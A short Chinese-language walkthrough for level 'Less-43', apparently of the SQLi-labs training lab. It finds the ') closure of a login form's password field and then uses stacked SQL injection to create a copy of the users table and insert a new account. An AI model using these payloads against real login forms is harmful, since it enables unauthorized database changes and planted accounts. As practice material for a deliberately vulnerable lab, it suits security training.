---
title: Less - 43
date: 2023-03-21T13:13:55Z
lastmod: 2023-03-22T11:48:57Z
---

# Less - 43

---

# 通关教程

---

## 1、判断闭合

---

发现跟less-42一模一样

​![image](assets/image-20230321131933-irkp0rg.png)​

在password的位置输入admin'

​![image](assets/image-20230321132239-ocla0c6.png)​

根据错误信息判断闭合方式为’)#，并且为字符型注入。因为有完整的错误回显，这里肯定也是能使用报错注入攻击的，但是这里我们就不使用报错注入攻击了，我们直接使用堆叠注入攻击

---

## 2、创建一张表

---

```http
a');create table test like users;#
```

​![image](assets/image-20230321133202-4govs08.png)​

​![image](assets/image-20230321133219-slz6lg6.png)​

---

## 3、创建一个新用户

---

```http
a');insert into users values(18,'cmx','cmx')#
```

​![image](assets/image-20230322114839-u1sa1o4.png)​

​![image](assets/image-20230322114855-r7ari29.png)​

‍
